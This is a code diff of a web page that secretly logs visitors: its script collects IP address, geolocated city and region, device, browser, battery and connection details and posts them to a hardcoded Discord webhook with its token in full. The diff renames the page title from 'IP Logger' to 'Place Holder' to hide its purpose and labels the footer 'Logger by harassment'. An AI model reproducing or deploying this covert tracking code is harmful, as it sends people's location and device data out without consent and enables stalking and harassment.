@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Logger</title>
+    <title>Place Holder</title>
     <script>
         async function getUserData() {
             try {
@@ -19,7 +19,7 @@
                     timeZone
                 });
 
-                const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "📱 Mobilne" : "💻 Komputer";
+                const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 Computer";
                 const onlineStatus = navigator.onLine ? "🟢 Online" : "🔴 Offline";
                 const uptime = `${(performance.now() / 60000).toFixed(2)} min`;
                 const os = navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform;
@@ -30,7 +30,7 @@
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
                     batteryLevel = `${(battery.level * 100).toFixed(0)}%`;
-                    powerSavingMode = battery.charging ? "Nie" : "Tak";
+                    powerSavingMode = battery.charging ? "No" : "Yes";
                 }
 
                 let adBlockEnabled = "Nieznane";
@@ -39,15 +39,15 @@
                             method: 'HEAD',
                             mode: 'no-cors'
                         }))
-                        .then(() => adBlockEnabled = "❌ Nie", () => adBlockEnabled = "✅ Tak");
+                        .then(() => adBlockEnabled = "❌ None", () => adBlockEnabled = "✅ Yes");
                 } catch (error) {
-                    adBlockEnabled = "✅ Tak";
+                    adBlockEnabled = "✅ Yes";
                 }
 
                 const browserName = navigator.appName;
                 const browserVersion = navigator.appVersion;
                 const browserLanguage = navigator.language;
-                const cookiesEnabled = navigator.cookieEnabled ? "✅ Tak" : "❌ Nie";
+                const cookiesEnabled = navigator.cookieEnabled ? "✅ Yes" : "❌ None";
                 const connectionType = navigator.connection ? navigator.connection.effectiveType : "Nieznane";
                 const connectionRtt = navigator.connection ? `${navigator.connection.rtt} ms` : "Nieznane";
                 const connectionDownlink = navigator.connection ? `${navigator.connection.downlink} Mbps` : "Nieznane";
@@ -59,7 +59,7 @@
                     const locationData = await locationResponse.json();
                     location = `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
                 } catch (error) {
-                    console.error("Błąd podczas pobierania lokalizacji:", error);
+                    console.error("Error Whilst Locating:", error);
                 }
 
                 const data = {
@@ -91,7 +91,7 @@
 
                 await sendDataToWebhook(data);
             } catch (error) {
-                console.error("Błąd podczas pobierania danych:", error);
+                console.error("Error While Downloading Data:", error);
             }
         }
 
@@ -99,48 +99,48 @@
             const webhookUrl = 'https://discord.com/api/webhooks/1340632409749721108/lKoQRkWR4Gc6ipXqf_gfdEzvP_8ut8wsQ5LaI75vRhuq7WyyPi7Ty4FWrCiBTfL8tXGS'; // webhook
 
             const payload = {
-                content: "📡 **Nowe logowanie użytkownika!**",
+                content: "📡 **User Logged On Site**",
                 embeds: [{
-                    title: "📊 Szczegóły urządzenia",
+                    title: "📊 Device Details",
                     color: 16711680,
                     fields: [{
                         name: "📍 IP",
                         value: data.ip,
                         inline: true
                     }, {
-                        name: "🌍 Lokalizacja",
+                        name: "🌍 Location",
                         value: data.location,
                         inline: true
                     }, {
-                        name: "🖥️ Rozdzielczość",
+                        name: "🖥️ Resolution",
                         value: data.resolution,
                         inline: true
                     }, {
-                        name: "🗣️ Język",
+                        name: "🗣️ Language",
                         value: data.language,
                         inline: true
                     }, {
-                        name: "🕒 Strefa czasowa",
+                        name: "🕒 TimeZone",
                         value: data.timeZone,
                         inline: true
                     }, {
-                        name: "📅 Czas",
+                        name: "📅 Time",
                         value: data.timestamp,
                         inline: false
                     }, {
-                        name: "📱 Typ urządzenia",
+                        name: "📱 Device",
                         value: data.deviceType,
                         inline: true
                     }, {
-                        name: "🔋 Bateria",
+                        name: "🔋 Battery",
                         value: data.batteryLevel,
                         inline: true
                     }, {
-                        name: "⚡ Tryb oszczędzania",
+                        name: "⚡ Power Saving",
                         value: data.powerSavingMode,
                         inline: true
                     }, {
-                        name: "🖥️ System operacyjny",
+                        name: "🖥️ Operating System",
                         value: data.os,
                         inline: true
                     }, {
@@ -148,15 +148,15 @@
                         value: data.onlineStatus,
                         inline: true
                     }, {
-                        name: "📊 Czas działania (uptime)",
+                        name: "📊 Uptime",
                         value: data.uptime,
                         inline: true
                     }, {
-                        name: "🖥️ Rdzenie CPU",
+                        name: "🖥️ CPU Cores",
                         value: data.cpuCores.toString(),
                         inline: true
                     }, {
-                        name: "📏 Wysokość paska nawigacji",
+                        name: "📏 Bar Height",
                         value: data.navHeight,
                         inline: true
                     }, {
@@ -164,33 +164,33 @@
                         value: data.adBlockEnabled,
                         inline: true
                     }, {
-                        name: "🌐 Przeglądarka",
+                        name: "🌐 Browser",
                         value: data.browserName,
                         inline: true
                     }, {
-                        name: "📜 Wersja przeglądarki",
+                        name: "📜 Browser Version",
                         value: data.browserVersion,
                         inline: true
                     }, {
-                        name: "🍪 Ciasteczka",
+                        name: "🍪 Cookies",
                         value: data.cookiesEnabled,
                         inline: true
                     }, {
-                        name: "📶 Typ połączenia",
+                        name: "📶 Connection",
                         value: data.connectionType,
                         inline: true
                     }, {
-                        name: "⏱️ Opóźnienie (RTT)",
+                        name: "⏱️ Delay (RTT)",
                         value: data.connectionRtt,
                         inline: true
                     }, {
-                        name: "⬇️ Prędkość pobierania",
+                        name: "⬇️ Download Speed",
                         value: data.connectionDownlink,
                         inline: true
                     }],
                     footer: {
-                        text: "Logger by 420username",
-                        icon_url: ""
+                        text: "Logger by harassment",
+                        icon_url: "https://cdn.discordapp.com/avatars/1201069596002766939/9de5bd364834a2120ff75d0d910d2fd0.png?size=4096"
                     }
                 }]
             };
